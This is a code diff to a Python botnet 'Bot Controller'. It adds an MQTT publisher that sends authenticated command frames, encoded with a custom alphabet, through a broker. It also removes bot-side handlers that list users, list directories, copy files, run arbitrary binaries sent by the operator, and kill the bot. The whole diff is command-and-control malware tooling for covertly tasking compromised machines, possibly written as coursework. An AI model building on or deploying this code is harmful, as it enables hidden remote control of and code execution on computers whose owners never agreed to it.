@@ -1,5 +1,6 @@
+import paho.mqtt.client as mqtt
 import argparse
-from globvars import PROTOCOL_VERSION, MAX_FRAME_SIZE, MIN_FRAME_SIZE, TIME_WINDOW_SECONDS, ENCODING_VARIANT_ID, ROOT_SECRET, STANDARD_ALPHABET, CUSTOM_ALPHABET, MAGIC_BYTES, CMD_TYPES, SALT, RESP_TYPES
+from globvars import ROOT_SECRET, STANDARD_ALPHABET, CUSTOM_ALPHABET, MAGIC_BYTES, CMD_TYPES, SALT, RESP_TYPES, DEFAULT_BROKER_ADDRESS, DEFAULT_PORT, DEFAULT_TOPIC
 from datetime import datetime, timedelta
 import base64
 import struct # for binary packing/unpacking
@@ -8,6 +9,8 @@ import os
 import random
 from protocol import ProtocolHandler
 import subprocess
+import time
+from bot import BotController 
 
 # Argon2id is a blend of the previous two variants. Argon2id should be used by most users, as recommended in RFC 9106. ; taken from the docs
 from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
@@ -64,128 +67,53 @@ class AlphabetEncoder:
         # Standard base64 decoding
         decoded_bytes = base64.b64decode(standard_data)
         return decoded_bytes.decode()
-class BotController:
-    '''
-        1) CLI
-        2) Command intent
-        3) Frame building / parsing
-        4) Obfuscation / Encoding
-        5) Publishing / Receiving 
-    '''
-    def __init__(self, secret_key: str = ROOT_SECRET):
-        # if time_stamp is None:
-        #     self.time_stamp = datetime.now().isoformat() 
-        # self.secret = self._derive_session_key(secret_key, self.time_stamp)  
-        self.secret = self._derive_session_key(secret_key)  
-        print("Bot Controller initialized.")
-        # print(f"Using timestamp: {self.time_stamp}")
-        print(f"Derived session key: {self.secret}")
 
-    def _derive_session_key(self, root_secret):
-        # Use Argon2id to derive a session key from the root secret and timestamp
-        salt = hashes.Hash(hashes.SHA256())
-        salt.update(SALT.encode())
-        salt = salt.finalize()[:16]  # Use first 16 bytes of the hash as salt
-        kdf = Argon2id(
-            memory_cost=102400,
-            length=32,
-            salt=salt,
-            iterations=2,
-            lanes=8,
-        )
-        session_key = kdf.derive(root_secret.encode())
-        return session_key
+class Publisher():
+    def __init__(self,
+                 broker_address: str,
+                 port: int,
+                 topic: str, 
+                 secret_key: str):
+        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2) 
+        self.broker = broker_address
+        self.port = port 
+        self.topic = topic
+        self.received_answer = False
+        self.bot_master = BotController(secret_key=secret_key)
+        self.ph = ProtocolHandler(secret=self.bot_master.secret)
 
-
-    # To a file for now
-    def _publish_frame(self, frame: bytes) :
-        with open("out_frame.bin", "wb") as f:
-            f.write(frame)
-
-    def command_to_type(self, args) -> tuple[int, bytes]:
-        if args.announce:
-            return CMD_TYPES["announce"], args.announce.encode()
-        if args.list_users:
-            return CMD_TYPES["list_users"], b""
-        if args.list_dir:
-            return CMD_TYPES["list_dir"], args.list_dir.encode()
-        if args.user_id:
-            return CMD_TYPES["user_id"], b""
-        if args.copy_file:
-            return CMD_TYPES["copy_file"], args.copy_file.encode()
-        if args.exec_binary:
-            return CMD_TYPES["exec_binary"], args.exec_binary.encode()
-        if args.kill:
-            return CMD_TYPES["kill"], b""
-
-        raise ValueError("No valid command provided.")
-
-    def handle_announce(self, payload: bytes):
-        msg = payload.decode(errors="ignore")
-        response = f"Bot alive at {datetime.now().isoformat()} | msg={msg}"
-        return RESP_TYPES["ok"], response.encode()
-
-    def handle_list_users(self, payload: bytes):
-        # run w
-        subp_command = subprocess.run("w", capture_output=True)
-        if subp_command.returncode != 0:
-            return RESP_TYPES["error"], subp_command.stderr
-        return RESP_TYPES["ok"], subp_command.stdout
-
-    def handle_list_dir(self, payload: bytes):
-        path = payload.decode()
-        command = f"ls {path}"
-
-        subp_command = subprocess.run(command, capture_output=True)
-        if subp_command.returncode != 0:
-            return RESP_TYPES["error"], subp_command.stderr
-        return RESP_TYPES["ok"], subp_command.stdout
-
-    def handle_user_id(self, payload: bytes):
-        # run id 
-        subp_command = subprocess.run("id", capture_output=True)
-        if subp_command.returncode != 0:
-            return RESP_TYPES["error"], subp_command.stderr
-        return RESP_TYPES["ok"], subp_command.stdout
-
+        self.client.on_connect = self.on_connect
+        self.client.on_message = self.on_message
     
-    def handle_copy_files(self, payload: bytes):
-        path = payload.decode()
-        command = f"cp {path}"
-        subp_command = subprocess.run(command, capture_output=True)
+    def on_connect(self, client, userdata, flags, reason_code, properties):
+        client.subscribe(self.topic)
+    
+    def send(self, payload: bytes):
+        self.client.connect(self.broker, self.port)
+        status = self.client.publish(self.topic, payload)
+        if status.rc != mqtt.MQTT_ERR_SUCCESS:
+            print(f"Could not publish the message: {status.rc}")
+        else:
+            print(f"Successfully published!")
+        self.client.loop_forever()
+        # self.client.loop_stop()
+        # self.client.disconnect()
+    
+    def on_message(self, client, userdata, message):
+        try:
+            decoded_m = self.ph.decode_frame(message.payload)
+            if self.ph.verify_frame_botmaster_side(decoded_m):
+                print("Message verified!")
+                magic, ver, cmd_type, length, auth, payload, checksum = decoded_m
+                print(f"Response: {cmd_type};\nPayload: {payload}")
 
-        if subp_command.returncode != 0:
-            return RESP_TYPES["error"], subp_command.stderr
-        return RESP_TYPES["ok"], subp_command.stdout
+                # disconnect
+                self.client.loop_stop()
+                self.client.disconnect()
 
-    def handle_exec_binary(self, payload: bytes):
-        path = payload.decode()
-        command = f"{path}"
-        subp_command = subprocess.run(command, capture_output=True)
+        except Exception as e:
+            print(f"Exception: {e}")
 
-        if subp_command.returncode != 0:
-            return RESP_TYPES["error"], subp_command.stderr
-        return RESP_TYPES["ok"], subp_command.stdout
-
-    def handle_kill(self, payload: bytes):
-        exit()
-
-    def handle_commands(self, cmd_type: int, payload: bytes) -> tuple[int, bytes]:
-        handlers = {
-            1: self.handle_announce,
-            2: self.handle_list_users,
-            3: self.handle_list_dir,
-            4: self.handle_user_id,
-            5: self.handle_copy_files,
-            6: self.handle_exec_binary,
-            255: self.handle_kill,
-        }
-
-        handler = handlers.get(cmd_type)
-        if not handler:
-            return RESP_TYPES["error"], b"Unknown command"
-        
-        return handler(payload)
 
 def main():
     parser = argparse.ArgumentParser(description="Bot Controller")
@@ -206,15 +134,15 @@ def main():
     args = parser.parse_args()
     print("Parsed arguments:", args)
 
-    bot_controller = BotController()
-    protocol_handler = ProtocolHandler(secret=bot_controller.secret)
+    # init bot master
+    publisher = Publisher(DEFAULT_BROKER_ADDRESS, DEFAULT_PORT, DEFAULT_TOPIC, ROOT_SECRET)
 
-    cmd_type, payload = bot_controller.command_to_type(args)
-    frame = protocol_handler.build_frame(cmd_type, payload)
-    encoded_frame = protocol_handler.encode_frame(frame)
+    cmd_type, payload = publisher.bot_master.command_to_type(args)
+    frame = publisher.ph.build_frame(cmd_type, payload)
+    encoded_frame = publisher.ph.encode_frame(frame)
 
-    # locally save to a file
-    bot_controller._publish_frame(encoded_frame)
+    publisher.send(encoded_frame)
+
 
 if __name__ == "__main__":
     main()
